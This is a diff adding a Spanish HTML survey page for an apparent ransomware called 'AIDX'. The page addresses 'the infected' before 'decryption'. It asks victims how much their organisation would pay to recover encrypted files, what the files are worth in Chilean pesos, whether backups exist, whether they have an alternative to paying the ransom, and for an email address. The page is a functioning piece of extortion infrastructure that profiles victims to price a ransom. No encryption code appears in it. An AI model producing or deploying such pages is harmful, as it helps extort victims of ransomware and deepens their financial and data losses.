@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Encuesta de Desencriptado - AIDX RANSONWARE</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="stylesenc.css">
+    
+</head>
+
+<body>
+
+    <div class="container my-5">
+        <h2 class="text-center mb-4">Encuesta para el infectado</h2>
+        <p>Antes de proceder con el proceso de desencriptado y eliminación de AIDX de su sistema operativo, por favor responda a las siguientes preguntas:</p>
+        <form action="procesar_encuesta.php" method="post" onsubmit="return validateForm();">
+
+
+        <div>
+            <div class="form-group">
+                <label for="conocimiento">1. ¿Cuánto cree usted que su organización esté dispuesta a pagar por recuperar los archivos encriptados en la carpeta files?</label>
+                <select class="form-control" id="conocimiento" name="conocimiento" required>
+                    <option value="" disabled selected>Seleccione una opción</option>
+                    <option value="MENOR A $50.000 CLP - $60 DÓLARES">MENOR A $50.000 CLP</option>
+                    <option value="IGUAL A $100.000 CLP">IGUAL A $100.000 CLP</option>
+                    <option value="IGUAL A $200.000 Y MENOR A $500.000 CLP">IGUAL A $200.000 Y MENOR A $500.000 CLP</option>
+                    <option value="SUPERIOR $ 500.000 CLP">SUPERIOR $ 500.000 CLP</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="experiencia">2. ¿Has perdido alguna información de vital importancia, ya sea por valor económico, operativo o sentimental?</label><br>
+                <div class="form-check form-check-inline">
+                    <input class="form-check-input" type="radio" name="experiencia" id="si" value="si" required>
+                    <label class="form-check-label" for="si">Sí</label>
+                </div>
+                <div class="form-check form-check-inline">
+                    <input class="form-check-input" type="radio" name="experiencia" id="no" value="no" required>
+                    <label class="form-check-label" for="no">No</label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="comentario">3. ¿Cuánto es el valor monetario estimado que usted le da a los archivos encriptados en la carpeta files?</label>
+                <select class="form-control" id="comentario" name="comentario" required>
+                    <option value="" disabled selected>Seleccione una opción</option>
+                    <option value="10.000 CLP">10.000 CLP ES EL COSTO QUE ESTIMO VALEN LOS ARCHIVOS DE LA CARPETA FILES</option>
+                    <option value="20.000 CLP">20.000 CLP ES EL COSTO QUE ESTIMO VALEN LOS ARCHIVOS DE LA CARPETA FILES</option>
+                    <option value="50.000 CLP">50.000 CLP ES EL COSTO QUE ESTIMO VALEN LOS ARCHIVOS DE LA CARPETA FILES</option>
+                    <option value="100.000 CLP">100.000 CLP ES EL COSTO QUE ESTIMO VALEN LOS ARCHIVOS DE LA CARPETA FILES</option>
+                    <option value="500.000 CLP">500.000 CLP ES EL COSTO QUE ESTIMO VALEN LOS ARCHIVOS DE LA CARPETA FILES</option>
+                    <option value="1.000.000 CLP">1.000.000 CLP ES EL COSTO QUE ESTIMO VALEN LOS ARCHIVOS DE LA CARPETA FILES</option>
+                </select>
+                <small class="form-text text-muted">Seleccione un valor estimado monto calculado en pesos chilenos (CLP).</small>
+            </div>
+
+            <div class="form-group">
+                <label for="tipo_archivos">4. ¿Qué tipo de archivos predominan en los datos cifrados?</label>
+                <select class="form-control" id="tipo_archivos" name="tipo_archivos" required>
+                    <option value="" disabled selected>Seleccione una opción</option>
+                    <option value="documentos_personales">Documentos personales (ej. fotos, diarios)</option>
+                    <option value="documentos_trabajo">Documentos de trabajo o profesionales</option>
+                    <option value="archivos_software">Archivos de software o proyectos</option>
+                    <option value="info_financiera">Información financiera</option>
+                    <option value="otros">Otros</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="respaldo">5. ¿La información cifrada es respaldada regularmente?</label>
+                <select class="form-control" id="respaldo" name="respaldo" required>
+                    <option value="" disabled selected>Seleccione una opción</option>
+                    <option value="diariamente">Sí, diariamente</option>
+                    <option value="semanalmente">Sí, semanalmente</option>
+                    <option value="mensualmente">Sí, mensualmente</option>
+                    <option value="no">No</option>
+                    <option value="unsure">No estoy seguro</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="victima_previa">6. ¿Has sido previamente víctima de un ataque de ransomware?</label><br>
+                <div class="form-check form-check-inline">
+                    <input class="form-check-input" type="radio" name="victima_previa" id="victima_si" value="si" required>
+                    <label class="form-check-label" for="victima_si">Sí</label>
+                </div>
+                <div class="form-check form-check-inline">
+                    <input class="form-check-input" type="radio" name="victima_previa" id="victima_no" value="no" required>
+                    <label class="form-check-label" for="victima_no">No</label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="plan_alternativo">7. Si decides no pagar el rescate, ¿tienes un plan alternativo para recuperar la información?</label><br>
+                <div class="form-check form-check-inline">
+                    <input class="form-check-input" type="radio" name="plan_alternativo" id="plan_si" value="si" required>
+                    <label class="form-check-label" for="plan_si">Sí</label>
+                </div>
+                <div class="form-check form-check-inline">
+                    <input class="form-check-input" type="radio" name="plan_alternativo" id="plan_no" value="no" required>
+                    <label class="form-check-label" for="plan_no">No</label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="notificacion_ransomware">8. ¿Cómo te enteraste de la infección por ransomware en tu sistema?</label>
+                <select class="form-control" id="notificacion_ransomware" name="notificacion_ransomware" required>
+                    <option value="" disabled selected>Seleccione una opción</option>
+                    <option value="mensaje_pantalla">Mensaje en pantalla</option>
+                    <option value="fallo_archivos">Fallo al intentar abrir archivos</option>
+                    <option value="alerta_seguridad">Alerta de software de seguridad</option>
+                    <option value="otros">Otros</option>
+                </select>
+            </div>
+
+
+            <div class="form-group">
+                    <label for="correo">Correo Electrónico (Identificador de Encuesta):</label>
+                    <input type="email" class="form-control" id="correo" name="correo" required>
+                    <small class="form-text text-muted">Ingrese su dirección de correo electrónico para identificar la encuesta.</small>
+                </div>
+            <div class="text-center">
+                <button type="submit" class="btn btn-primary" id="submitBtn">Enviar y Proceder al Desencriptado</button>
+            </form>
+
+        </div>
+           
+    </div>
+
+  <script src="encuesta.js"></script>
+</body>
+
+</html>
+
+
